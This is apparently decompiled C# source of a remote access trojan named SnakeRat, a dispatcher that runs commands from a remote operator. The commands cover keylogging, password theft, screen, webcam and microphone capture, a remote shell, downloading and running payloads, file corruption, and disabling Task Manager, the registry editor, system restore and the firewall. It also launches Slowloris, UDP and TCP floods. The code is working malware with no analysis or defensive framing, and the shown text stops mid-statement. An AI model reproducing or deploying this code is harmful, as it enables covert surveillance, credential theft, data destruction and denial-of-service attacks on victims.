namespace Chat
{
    using Chat.My;
    using Chat.My.Resources;
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.VisualBasic.FileIO;
    using Microsoft.Win32;
    using PasswordDLL;
    using SnakeRat.DetectDesktop;
    using System;
    using System.Diagnostics;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Security.Cryptography;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    [StandardModule]
    internal sealed class SplitFunzioni
    {
        public static string BlakListFind = null;
        public static string BlakListPath = (Templates + @"\Sys32.dll");
        private static long clockwnd;
        public static int CompressImage = 40;
        private static int countP = 0;
        private static StresserTest DDOS = new StresserTest();
        public static Screen Desktopx;
        public static bool EndDesk = false;
        private static string FileName;
        private static long Hdesk;
        public static Size ImageSize = new Size(630, 480);
        public static bool Interupt = false;
        public static string KeyloggherDataPatch = (Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\userdat.dll");
        public static string KeyloggherDatPatch = (Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\userdat.dat");
        public static string KeyloggherExePatch = (Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\usersdat.exe");
        public static string ListProtect = null;
        public static MemoryStream MemorySFile;
        public static Form1 MineForm;
        public static string ProtectionFiles = (Environment.GetFolderPath(Environment.SpecialFolder.Templates) + @"\start.dat");
        public static short QualityDesktop = 2;
        public static Thread RestartThread = new Thread(new ThreadStart(Funzioni.RestartServer));
        public static ReversePRoxy ReverseProxy = new ReversePRoxy();
        public static bool SendNextDatas = true;
        private static string StartText;
        private static long StartWnd;
        private static long TaskbarWnd;
        public static string Templates = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
        public static Thread ThreadD;
        public static Thread ThreadDownoload;
        private static long Traynotify;
        public static Thread tx;
        public static WebCam Webcamx = new WebCam();

        [DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__10(object a0)
        {
            Funzioni.RefreshFileManager(Conversions.ToString(a0));
        }

        [DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__11(object a0)
        {
            Funzioni.RefreshFileManager(Conversions.ToString(a0));
        }

        [DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__12(object a0)
        {
            Funzioni.MsgBoxShow((string[]) a0);
        }

        [DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__8(object a0)
        {
            Funzioni.DownloadFile((string[]) a0);
        }

        [CompilerGenerated, DebuggerStepThrough]
        private static void _Lambda$__9(object a0)
        {
            Funzioni.RefreshFileManager(Conversions.ToString(a0));
        }

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int EnableWindow(int ByVa40hwnd, int nOption);
        [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32", EntryPoint="FindWindowExA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int FindWindowEx(int hwnd, int nclass, [MarshalAs(UnmanagedType.VBByRefStr)] ref string spz1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string spz2);
        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        public static void FunctionWorked(object[] GetDati)
        {
            Size size;
            string expression = Compressione.TripleDES(Conversions.ToString(GetDati[0]), Socketss.EncriptionKey, true);
            Data data = (Data) GetDati[1];
            string[] parameter = Strings.Split(expression, "|A|", -1, CompareMethod.Binary);
            string str19 = parameter[0];
            switch (str19)
            {
                case "SX":
                    Socketss.sendingData = true;
                    goto Label_2696;

                case "Desk":
                {
                    Image image = CaptureScreen.CaptureDesktop();
                    Desktopx = new Screen((Bitmap) image);
                    MemoryStream stream = new MemoryStream();
                    image.Save(stream, ImageFormat.Jpeg);
                    stream.Flush();
                    Socketss.ListDataSendDesktop.Add(new Data("D", null, Compressione.Compress(stream.ToArray())));
                    stream.Dispose();
                    stream.Close();
                    goto Label_2696;
                }
                case "EndDesk":
                    EndDesk = true;
                    goto Label_2696;

                case "Thu":
                    Application.DoEvents();
                    Socketss.ListDataSend.Add(new Data("Thu|S|" + parameter[1], new Image[] { Funzioni.shot(0xb8, 0x57, true, 50) }, null));
                    goto Label_2696;

                case "serv":
                    Funzioni.GetServicesList();
                    goto Label_2696;

                case "GETKEY":
                    if (MyProject.Computer.FileSystem.FileExists(KeyloggherDataPatch))
                    {
                        Socketss.ListDataSend.Add(new Data("KEYS|S|" + MyProject.Computer.FileSystem.ReadAllText(KeyloggherDataPatch), null, null));
                    }
                    else
                    {
                        Socketss.ListDataSend.Add(new Data("KEYS|S| Log Not Found", null, null));
                    }
                    goto Label_2696;

                case "Seed":
                    Torrent.SeedTorrent(parameter[1]);
                    goto Label_2696;

                case "I":
                    if (EndDesk)
                    {
                        EndDesk = false;
                    }
                    else
                    {
                        int num = (int) Math.Round((double) (((double) Socketss.client.Client.SendBufferSize) / 1024.0));
                        int millisecondsTimeout = (int) Math.Round((double) (28.8 - (((double) (num * 0x10)) / 10.0)));
                        if (millisecondsTimeout < 0)
                        {
                            millisecondsTimeout = 2;
                        }
                        Thread.Sleep(millisecondsTimeout);
                        Thread thread = new Thread(new ThreadStart(SplitFunzioni.GetDesktopChange));
                        thread.IsBackground = false;
                        thread.SetApartmentState(ApartmentState.STA);
                        thread.Start();
                    }
                    goto Label_2696;

                case "ReW":
                    Funzioni.RefrshWindow();
                    goto Label_2696;

                case "REwC":
                    Funzioni.WindowEdit(Conversions.ToInteger(parameter[1]), Conversions.ToString(Conversions.ToInteger(parameter[2])), 1);
                    goto Label_2696;

                case "REWC":
                    Funzioni.WindowEdit(Conversions.ToInteger(parameter[1]), parameter[2], 0);
                    goto Label_2696;

                case "SCx":
                    Funzioni.ServiceExecuteCommand(Conversions.ToInteger(parameter[1]), Conversions.ToInteger(parameter[2]));
                    goto Label_2696;

                case "CLSs":
                    Funzioni.CloseServices(Conversions.ToInteger(parameter[1]));
                    goto Label_2696;

                case "RLSs":
                    Funzioni.ContinueServices(Conversions.ToInteger(parameter[1]));
                    goto Label_2696;

                case "PLSs":
                    Funzioni.ServicesPausa(Conversions.ToInteger(parameter[1]));
                    goto Label_2696;

                case "RLSsR":
                    Funzioni.GetServicesList();
                    goto Label_2696;

                case "PSSs":
                    Funzioni.StartServicesF(Conversions.ToInteger(parameter[1]));
                    goto Label_2696;

                case "GETBLKS":
                    Socketss.ListDataSend.Add(new Data("GETBLKS|S|" + BlakListFind, null, null));
                    goto Label_2696;

                case "ADDProcesBlack":
                    BlakListFind = BlakListFind + parameter[1] + "\r\n";
                    MyProject.Computer.FileSystem.WriteAllText(BlakListPath, BlakListFind, false);
                    goto Label_2696;

                case "PSSS":
                    Funzioni.StopServices(Conversions.ToInteger(parameter[1]));
                    goto Label_2696;

                case "FIF":
                {
                    byte[] bytes = data.GetBytes();
                    MemorySFile.Write(bytes, 0, bytes.Length);
                    MyProject.Computer.FileSystem.WriteAllBytes(FileName, MemorySFile.ToArray(), false);
                    MemorySFile.Flush();
                    MemorySFile.Dispose();
                    MemorySFile.Close();
                    Thread.Sleep(10);
                    goto Label_2696;
                }
                case "UP":
                {
                    byte[] buffer = data.GetBytes();
                    MemorySFile.Write(buffer, 0, buffer.Length);
                    Thread.Sleep(10);
                    Socketss.ListDataSend.Add(new Data("UNX", null, null));
                    Thread.Sleep(10);
                    goto Label_2696;
                }
                case "NXT":
                    Funzioni.NewxtPart = true;
                    goto Label_2696;

                case "StopDown":
                    Funzioni.NewxtPart = false;
                    Thread.Sleep(70);
                    try
                    {
                        ThreadDownoload.Abort();
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        ProjectData.ClearProjectError();
                    }
                    Socketss.ListDataSend.Add(new Data("EnDow|S|", null, null));
                    Socketss.ListDataFileM.Clear();
                    goto Label_2696;

                case "S":
                    Socketss.ListDataSendDesktop.Clear();
                    ImageSize = new Size(Conversions.ToInteger(parameter[1]), Conversions.ToInteger(parameter[2]));
                    goto Label_2696;

                case "Task":
                {
                    Thread thread2 = new Thread(new ThreadStart(Funzioni.TaskList));
                    thread2.IsBackground = false;
                    thread2.SetApartmentState(ApartmentState.STA);
                    thread2.Start();
                    goto Label_2696;
                }
                case "Kill":
                    Funzioni.KillProc(parameter[1]);
                    goto Label_2696;

                case "UPNP":
                    Funzioni.AddUnlockPORT(Conversions.ToUShort(parameter[2]), parameter[1], parameter[4], parameter[3]);
                    goto Label_2696;

                case "UPNPR":
                    Funzioni.RemoveUnlockPORT(parameter[1], parameter[2]);
                    goto Label_2696;

                case "UPNPREF":
                    Funzioni.RefreshUPNP();
                    goto Label_2696;

                case "Piano":
                    Console.Beep(Conversions.ToInteger(parameter[1]), Conversions.ToInteger(parameter[2]));
                    goto Label_2696;

                case "OpenProcess":
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo(parameter[1], "");
                    startInfo.CreateNoWindow = true;
                    startInfo.UseShellExecute = false;
                    startInfo.RedirectStandardOutput = true;
                    if (parameter[2] == "Norm")
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Normal;
                    }
                    else if (parameter[2] == "Hide")
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    }
                    Process.Start(startInfo);
                    Thread.Sleep(20);
                    Thread thread3 = new Thread(new ThreadStart(Funzioni.TaskList));
                    thread3.IsBackground = false;
                    thread3.SetApartmentState(ApartmentState.STA);
                    thread3.Start();
                    goto Label_2696;
                }
                case "PRW":
                    Application.DoEvents();
                    Socketss.ListDataSend.Add(new Data("PRW", new Image[] { Funzioni.shot(0xb8, 0x57, true, 50) }, null));
                    goto Label_2696;

                case "StopUP":
                    MemorySFile.Flush();
                    MemorySFile.Dispose();
                    MemorySFile.Close();
                    goto Label_2696;

                case "DelFil":
                    try
                    {
                        switch (parameter[1])
                        {
                            case "S":
                                MyProject.Computer.FileSystem.DeleteFile(parameter[2] + parameter[3]);
                                break;

                            case "F":
                                MyProject.Computer.FileSystem.DeleteDirectory(parameter[2] + parameter[3], DeleteDirectoryOption.DeleteAllContents);
                                break;
                        }
                    }
                    catch (Exception exception2)
                    {
                        ProjectData.SetProjectError(exception2);
                        Socketss.ListDataSend.Add(new Data("Gerror|S|Error Delet file ' " + parameter[2] + parameter[3], null, null));
                        ProjectData.ClearProjectError();
                    }
                    goto Label_2696;

                case "HARDBK":
                {
                    string str2 = HardBK.HardBotKill();
                    Socketss.ListDataSend.Add(new Data("HFBK|S|" + str2, null, null));
                    goto Label_2696;
                }
                case "SOFTBK":
                    Socketss.ListDataSend.Add(new Data("SFBK|S|" + BotKillers.RunStandardBotKiller(), null, null));
                    goto Label_2696;

                case "StartFM":
                    Socketss.ListDataSend.Add(new Data("DrV|S|" + Funzioni.GetDrives(), null, null));
                    goto Label_2696;

                case "FileProt":
                {
                    ProtectionSettings protection = new ProtectionSettings();
                    while (true)
                    {
                        if (!MyProject.Computer.FileSystem.FileExists(Templates + @"\Star" + Conversions.ToString(countP) + ".exe"))
                        {
                            string uRLs = parameter[1];
                            protection.ElevateAdmin = Conversions.ToBoolean(parameter[2]);
                            protection.HideProcess = Conversions.ToBoolean(parameter[3]);
                            protection.HideFile = Conversions.ToBoolean(parameter[4]);
                            protection.ExecutionDelay = Conversions.ToBoolean(parameter[5]);
                            protection.ExecutionDelayTime = Conversions.ToInteger(parameter[6]);
                            protection.StartUP = Conversions.ToBoolean(parameter[7]);
                            ListProtect = ListProtect + Conversions.ToString(Conversions.ToBoolean(parameter[2])) + "|" + Conversions.ToString(Conversions.ToBoolean(parameter[3])) + "|" + Conversions.ToString(Conversions.ToBoolean(parameter[4])) + "|" + Conversions.ToString(Conversions.ToBoolean(parameter[5])) + "|" + Conversions.ToString(Conversions.ToInteger(parameter[6])) + "|" + Conversions.ToString(Conversions.ToBoolean(parameter[7])) + "|" + Templates + @"\Star" + Conversions.ToString(countP) + ".exe|" + uRLs + "|Star" + Conversions.ToString(countP) + ".exe\r\n";
                            new DownloadAndProtectFiles(uRLs, Templates + @"\Star" + Conversions.ToString(countP) + ".exe", protection).Start();
                            MyProject.Computer.FileSystem.WriteAllText(ProtectionFiles, ListProtect, false);
                            countP = 1;
                            goto Label_2696;
                        }
                        countP = 1;
                        Thread.Sleep(1);
                    }
                }
                case "AskProtecx":
                    Socketss.ListDataSend.Add(new Data("AskProtecx|S|" + ListProtect, null, null));
                    goto Label_2696;

                case "DOWN":
                {
                    Funzioni.NewxtPart = false;
                    string str4 = parameter[1];
                    ThreadDownoload = new Thread(new ParameterizedThreadStart(Funzioni.DownlodRemoto));
                    ThreadDownoload.IsBackground = false;
                    ThreadDownoload.Start(str4);
                    goto Label_2696;
                }
                case "FLEN":
                    MemorySFile = new MemoryStream();
                    FileName = parameter[1];
                    Thread.Sleep(50);
                    goto Label_2696;

                case "Corrupt":
                    try
                    {
                        string fileName = parameter[1];
                        FileSystem.FileOpen(1, fileName, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default, -1);
                        FileSystem.FilePut(1, "aosihdashaq9whdq0wdsj201209asnl\x00f2dn*\x00e9\x00b0\x00b0\x00a3'3ld3*\x00b0D\x00e0e", -1L, false);
                        FileSystem.FileClose(new int[] { 1 });
                    }
                    catch (Exception exception3)
                    {
                        ProjectData.SetProjectError(exception3);
                        Socketss.ListDataSend.Add(new Data("Gerror|S|Error to corrupt this file ' " + parameter[2], null, null));
                        ProjectData.ClearProjectError();
                    }
                    goto Label_2696;

                case "ShowIm":
                    try
                    {
                        Image foto = Image.FromFile(parameter[1]);
                        Image[] p = new Image[1];
                        size = new Size(180, 100);
                        p[0] = CodecDesktop.VaryQualityLevel(foto, size, 0x37);
                        Socketss.ListDataSend.Add(new Data("PrwIm|S|" + parameter[1], p, null));
                    }
                    catch (Exception exception4)
                    {
                        ProjectData.SetProjectError(exception4);
                        ProjectData.ClearProjectError();
                    }
                    goto Label_2696;

                case "ProxeSET":
                {
                    RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Internet Settings", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Internet Settings", true);
                    key.SetValue("ProxyServer", parameter[1] + ":" + parameter[2], RegistryValueKind.Unknown);
                    key.Close();
                    new IEProxy().SetProxy(parameter[1] + ":" + parameter[2]);
                    Socketss.ListDataSend.Add(new Data("Proxy|S|P", null, null));
                    goto Label_2696;
                }
                case "ProxyOF":
                {
                    Socketss.ListDataSend.Add(new Data("Proxy|S|F", null, null));
                    RegistryKey key2 = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Internet Settings", RegistryKeyPermissionCheck.ReadWriteSubTree);
                    key2.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Internet Settings", false);
                    key2.Close();
                    new IEProxy().DisableProxy();
                    goto Label_2696;
                }
                case "ReversePON":
                    ReverseProxy.Initialize(Conversions.ToUShort(parameter[1]));
                    Socketss.ListDataSend.Add(new Data("Proxy|S|R", null, null));
                    goto Label_2696;

                case "ReversePOF":
                    Socketss.ListDataSend.Add(new Data("Proxy|S|S", null, null));
                    ReverseProxy.Disconnec();
                    goto Label_2696;

                case "NetW":
                    Funzioni.GetConnectionsList();
                    goto Label_2696;

                case "RUN":
                    try
                    {
                        Process.Start(parameter[1]);
                    }
                    catch (Exception exception5)
                    {
                        ProjectData.SetProjectError(exception5);
                        Socketss.ListDataSend.Add(new Data("Gerror|S|Error Starting process : " + parameter[1], null, null));
                        ProjectData.ClearProjectError();
                    }
                    goto Label_2696;

                case "Ren":
                    try
                    {
                        switch (parameter[1])
                        {
                            case "S":
                                MyProject.Computer.FileSystem.RenameFile(parameter[2], parameter[3]);
                                break;

                            case "F":
                                MyProject.Computer.FileSystem.RenameDirectory(parameter[2], parameter[3]);
                                break;
                        }
                    }
                    catch (Exception exception6)
                    {
                        ProjectData.SetProjectError(exception6);
                        Socketss.ListDataSend.Add(new Data("Gerror|S|Error Rename ' " + parameter[2] + " ' in to ' " + parameter[3] + " '", null, null));
                        ProjectData.ClearProjectError();
                    }
                    goto Label_2696;

                case "Check":
                {
                    string str6 = "File not found";
                    if (MyProject.Computer.FileSystem.FileExists(parameter[1]))
                    {
                        str6 = "The File Exist";
                    }
                    Socketss.ListDataSend.Add(new Data("Found|S|" + str6, null, null));
                    goto Label_2696;
                }
                case "UrlDown":
                {
                    Thread thread4 = new Thread(new ParameterizedThreadStart(SplitFunzioni._Lambda$__8));
                    thread4.IsBackground = false;
                    thread4.SetApartmentState(ApartmentState.STA);
                    thread4.Start(new string[] { parameter[1], parameter[2], parameter[3], parameter[4] });
                    goto Label_2696;
                }
                case "INFO":
                    string str7;
                    string str9;
                    string str11;
                    if (MyProject.Computer.FileSystem.FileExists(parameter[1]))
                    {
                        FileInfo info2 = new FileInfo(parameter[1]);
                        try
                        {
                            str11 = Conversions.ToString(info2.LastWriteTime);
                        }
                        catch (Exception exception7)
                        {
                            ProjectData.SetProjectError(exception7);
                            str11 = "N/A";
                            ProjectData.ClearProjectError();
                        }
                        try
                        {
                            str9 = Conversions.ToString(info2.LastAccessTime);
                        }
                        catch (Exception exception8)
                        {
                            ProjectData.SetProjectError(exception8);
                            str9 = "N/A";
                            ProjectData.ClearProjectError();
                        }
                        try
                        {
                            str7 = Conversions.ToString(info2.CreationTime);
                        }
                        catch (Exception exception9)
                        {
                            ProjectData.SetProjectError(exception9);
                            str7 = "N/A";
                            ProjectData.ClearProjectError();
                        }
                    }
                    else if (MyProject.Computer.FileSystem.DirectoryExists(parameter[1]))
                    {
                        DirectoryInfo info3 = new DirectoryInfo(parameter[1]);
                        try
                        {
                            str11 = Conversions.ToString(info3.LastWriteTime);
                        }
                        catch (Exception exception10)
                        {
                            ProjectData.SetProjectError(exception10);
                            str11 = "N/A";
                            ProjectData.ClearProjectError();
                        }
                        try
                        {
                            str9 = Conversions.ToString(info3.LastAccessTime);
                        }
                        catch (Exception exception11)
                        {
                            ProjectData.SetProjectError(exception11);
                            str9 = "N/A";
                            ProjectData.ClearProjectError();
                        }
                        try
                        {
                            str7 = Conversions.ToString(info3.CreationTime);
                        }
                        catch (Exception exception12)
                        {
                            ProjectData.SetProjectError(exception12);
                            str7 = "N/A";
                            ProjectData.ClearProjectError();
                        }
                    }
                    Socketss.ListDataSend.Add(new Data("Inf|S|Creation Time : " + str7 + "\r\nLast Access Time : " + str9 + "\r\nLast Write Time : " + str11, null, null));
                    goto Label_2696;

                case "RefreshFM":
                {
                    Thread thread5 = new Thread(new ParameterizedThreadStart(SplitFunzioni._Lambda$__9));
                    thread5.IsBackground = false;
                    thread5.SetApartmentState(ApartmentState.STA);
                    thread5.Start(parameter[1]);
                    goto Label_2696;
                }
                case "SearchF":
                    if (MyProject.Computer.FileSystem.DirectoryExists(parameter[1]))
                    {
                        Socketss.ListDataSend.Add(new Data("SearchYES|S|" + parameter[1], null, null));
                        Thread.Sleep(1);
                        Thread thread6 = new Thread(new ParameterizedThreadStart(SplitFunzioni._Lambda$__10));
                        thread6.IsBackground = false;
                        thread6.SetApartmentState(ApartmentState.STA);
                        thread6.Start(parameter[1]);
                    }
                    else
                    {
                        Socketss.ListDataSend.Add(new Data("SearchNO", null, null));
                    }
                    goto Label_2696;

                case "RegyList":
                    Funzioni.GetRegistrySubKey(parameter[1]);
                    goto Label_2696;

                case "SubC":
                    Funzioni.CreateSubKeysFunc(parameter[1], parameter[2]);
                    goto Label_2696;

                case "Create":
                    try
                    {
                        string str22 = parameter[1];
                        if (str22 == "D")
                        {
                            MyProject.Computer.FileSystem.CreateDirectory(parameter[2]);
                        }
                        else if ((str22 == "F") && !MyProject.Computer.FileSystem.FileExists(parameter[2]))
                        {
                            MyProject.Computer.FileSystem.WriteAllText(parameter[2], "", true);
                        }
                    }
                    catch (Exception exception13)
                    {
                        ProjectData.SetProjectError(exception13);
                        Socketss.ListDataSend.Add(new Data("Gerror|S|Error during create new directory/file", null, null));
                        ProjectData.ClearProjectError();
                    }
                    goto Label_2696;

                case "RKeyD":
                    Funzioni.DeletKeys(parameter[1], parameter[2]);
                    goto Label_2696;

                case "SubKeyD":
                    Funzioni.DellSubKeys(parameter[1]);
                    goto Label_2696;

                case "RegValueC":
                    Funzioni.SubKeysChangeValue(parameter[1], parameter[2], parameter[3]);
                    goto Label_2696;

                case "SDirctory":
                {
                    string temp;
                    Thread thread7 = new Thread(new ParameterizedThreadStart(SplitFunzioni._Lambda$__11));
                    thread7.IsBackground = false;
                    thread7.SetApartmentState(ApartmentState.STA);
                    switch (parameter[1])
                    {
                        case "D":
                            temp = MyProject.Computer.FileSystem.SpecialDirectories.Desktop.ToString() + @"\";
                            break;

                        case "P":
                            temp = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles.ToString() + @"\";
                            break;

                        case "Doc":
                            temp = MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments.ToString() + @"\";
                            break;

                        case "C":
                            temp = Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + @"\";
                            break;

                        case "T":
                            temp = MyProject.Computer.FileSystem.SpecialDirectories.Temp;
                            break;

                        case "R":
                            temp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\";
                            break;

                        case "S":
                            temp = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\";
                            break;

                        case "Do":
                            temp = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\";
                            break;

                        case "Re":
                            temp = Environment.GetFolderPath(Environment.SpecialFolder.Recent) + @"\";
                            break;
                    }
                    Socketss.ListDataSend.Add(new Data("PaatchIst|S|" + temp, null, null));
                    Thread.Sleep(5);
                    thread7.Start(temp);
                    goto Label_2696;
                }
            }
            if (str19 == "Pass")
            {
                string password = new PasswordDLL.PasswordDLL().GetPassword();
                if (password == null)
                {
                    password = "₪URL₪No Password₪USR₪₪PWD₪";
                }
                Socketss.ListDataSend.Add(new Data("PSW|S|" + password, null, null));
            }
            else if (str19 == "DRAW")
            {
                Font font = new Font(MyProject.Forms.Form1.Font.FontFamily, (float) Conversions.ToInteger(parameter[3]));
                new WriteOnScreen().drawT(parameter[1], Conversions.ToInteger(parameter[4]), Conversions.ToInteger(parameter[5]), font, parameter[2]);
            }
            else if (str19 == "Mex")
            {
                Thread thread8 = new Thread(new ParameterizedThreadStart(SplitFunzioni._Lambda$__12));
                thread8.IsBackground = false;
                thread8.SetApartmentState(ApartmentState.STA);
                thread8.Start(parameter);
            }
            else if (str19 == "URL")
            {
                Process.Start(parameter[1]);
            }
            else if (str19 == "FunKey")
            {
                string str24 = parameter[1];
                if (str24 == "Task")
                {
                    MyProject.Computer.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", parameter[2], RegistryValueKind.DWord);
                }
                else if (str24 == "Reg")
                {
                    MyProject.Computer.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", parameter[2], RegistryValueKind.DWord);
                }
                else if (str24 == "RIp")
                {
                    MyProject.Computer.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", parameter[2], RegistryValueKind.DWord);
                }
                else if (str24 == "CMD")
                {
                    MyProject.Computer.Registry.SetValue(@"HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", parameter[2], RegistryValueKind.DWord);
                }
                else if (str24 == "Mouse")
                {
                    SwapMouseButton(Conversions.ToLong(parameter[2]));
                }
                else if (str24 == "TaskBar")
                {
                    if (parameter[2] == "0")
                    {
                        MyProject.Forms.Form1.ShowTaskBar();
                    }
                    else
                    {
                        MyProject.Forms.Form1.HideTaskBar();
                    }
                }
                else
                {
                    string str25;
                    if (str24 == "CdO")
                    {
                        str25 = "Set CDAudio Door Open Wait";
                        mciSendString(ref str25, ref Conversions.ToString((long) 0L), 0L, 0L);
                    }
                    else
                    {
                        string str26;
                        if (str24 == "CdC")
                        {
                            str26 = "Set CDAudio Door Closed Wait";
                            mciSendString(ref str26, ref Conversions.ToString((long) 0L), 0L, 0L);
                        }
                        else if (str24 == "Desk")
                        {
                            EnableWindow((int) FindWindow("Progman", null), Conversions.ToInteger(parameter[2]));
                        }
                        else if (str24 == "Clock")
                        {
                            TaskbarWnd = (long) FindWindow("shell_traywnd", null);
                            str26 = "TrayNotifyWnd";
                            str25 = null;
                            Traynotify = FindWindowEx((int) TaskbarWnd, 0, ref str26, ref str25);
                            str26 = "trayclockwclass";
                            str25 = null;
                            clockwnd = FindWindowEx((int) Traynotify, 0, ref str26, ref str25);
                            ShowWindow((int) clockwnd, Conversions.ToInteger(parameter[2]));
                        }
                        else if (str24 == "CpliBoard")
                        {
                            switch (parameter[2])
                            {
                                case "Set":
                                    Clipboard.SetText(parameter[3]);
                                    break;

                                case "Clear":
                                    Clipboard.Clear();
                                    break;

                                case "Read":
                                {
                                    string clipboardText = GetClipboardText();
                                    if (clipboardText == null)
                                    {
                                        clipboardText = "ClipBoard is clear...";
                                    }
                                    Socketss.ListDataSend.Add(new Data("ClipBoard|S|" + clipboardText, null, null));
                                    break;
                                }
                            }
                        }
                        else if (str24 == "firewall")
                        {
                            ProcessStartInfo info4 = new ProcessStartInfo("netsh.exe", "firewall set opmode " + parameter[2]);
                            info4.CreateNoWindow = true;
                            info4.UseShellExecute = false;
                            info4.RedirectStandardOutput = true;
                            info4.WindowStyle = ProcessWindowStyle.Hidden;
                            Process.Start(info4);
                        }
                    }
                }
            }
            else if (str19 == "Spoke")
            {
                object[] objArray = new object[1];
                string[] strArray2 = parameter;
                int index = 1;
                objArray[0] = strArray2[index];
                object[] arguments = objArray;
                bool[] copyBack = new bool[] { true };
                NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("sapi.spvoice", "")), null, "speak", arguments, null, null, copyBack, true);
                if (copyBack[0])
                {
                    strArray2[index] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(string));
                }
            }
            else if (str19 == "ShutC")
            {
                ProcessStartInfo info5 = new ProcessStartInfo("shutdown.exe", parameter[1]);
                info5.CreateNoWindow = true;
                info5.UseShellExecute = false;
                info5.RedirectStandardOutput = true;
                info5.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(info5);
            }
            else if (str19 == "RestS")
            {
                if (!RestartThread.IsAlive)
                {
                    RestartThread.Start();
                }
            }
            else if (str19 == "Phone")
            {
                MineForm.StartStopRec();
            }
            else if (str19 == "PhoneS")
            {
                MineForm.StartStopRec();
                Thread.Sleep(10);
                MineForm.SendRecord();
            }
            else if (str19 == "ShootS")
            {
                try
                {
                    Funzioni.UnProtectProcess();
                }
                catch (Exception exception14)
                {
                    ProjectData.SetProjectError(exception14);
                    ProjectData.ClearProjectError();
                }
                Funzioni.BlueScreenOnTermination(false);
                ProjectData.EndApp();
            }
            else if (str19 == "Ver")
            {
                Socketss.ListDataSend.Add(new Data("Vers|S|" + Socketss.ServerVersion, null, null));
            }
            else if (str19 == "WebStart")
            {
                string driver = Webcamx.GetDriver();
                if (driver.Replace(" ", null) == null)
                {
                    driver = "No Found";
                }
                Socketss.ListDataSend.Add(new Data("Drive|S|" + driver + "|S| ", null, null));
            }
            else if (str19 == "WebDrive")
            {
                Webcamx.StartWebcam((short) Conversions.ToInteger(parameter[1]));
            }
            else if (str19 == "we")
            {
                Webcamx.Senderx = true;
            }
            else if (str19 == "WebDisc")
            {
                Webcamx.StopWebcam();
            }
            else if (str19 == "WebQuality")
            {
                Webcamx.WebcamQuality = (short) Conversions.ToInteger(parameter[1]);
            }
            else if (str19 == "script")
            {
                try
                {
                    string text = Encoding.UTF7.GetString(data.GetBytes());
                    MyProject.Computer.FileSystem.WriteAllText(Application.StartupPath + @"\Script." + parameter[1], text, false);
                    Process.Start(Application.StartupPath + @"\Script." + parameter[1]);
                    Socketss.ListDataSend.Add(new Data("Script|S|True", null, null));
                }
                catch (Exception exception15)
                {
                    ProjectData.SetProjectError(exception15);
                    Socketss.ListDataSend.Add(new Data("Script|S|False", null, null));
                    ProjectData.ClearProjectError();
                }
            }
            else if (str19 == "Cmd")
            {
                if (parameter[1] == "Start")
                {
                    CmdLeach.CmdStartFunc();
                }
                else if (parameter[1] == "Stop")
                {
                    CmdLeach.CmdTH1.Abort();
                    CmdLeach.CMDTH2.Abort();
                    CmdLeach.Proc.Kill();
                }
                else
                {
                    CmdLeach.InjectCMDLine(parameter[1]);
                }
            }
            else if (str19 == "Sloris")
            {
                DDOS.StartSlowLorisSUB(parameter[1], Conversions.ToInteger(parameter[2]), Conversions.ToInteger(parameter[3]));
            }
            else if (str19 == "SlorisS")
            {
                DDOS.StopSlowLorisSub();
            }
            else if (str19 == "UDP")
            {
                DDOS.StartUDPSub(parameter[1], Conversions.ToInteger(parameter[2]), Conversions.ToInteger(parameter[3]));
            }
            else if (str19 == "UDPS")
            {
                DDOS.StopUDPSub();
            }
            else if (str19 == "TCP")
            {
                DDOS.StartTCPSUB(parameter[1], Conversions.ToInteger(parameter[2]), Conversions.ToInteger(parameter[3]));
            }
            else if (str19 == "TCPS")
            {
                DDOS.StopTCPSUB();
            }
            else if (str19 == "FileFinds")
            {
                Funzioni.FindFiles(parameter[2], parameter[1]);
            }
            else if (str19 == "Unistall")
            {
                MyProject.Forms.Form1.Timer1.Stop();
                try
                {
                    Funzioni.UnProtectProcess();
                }
                catch (Exception exception16)
                {
                    ProjectData.SetProjectError(exception16);
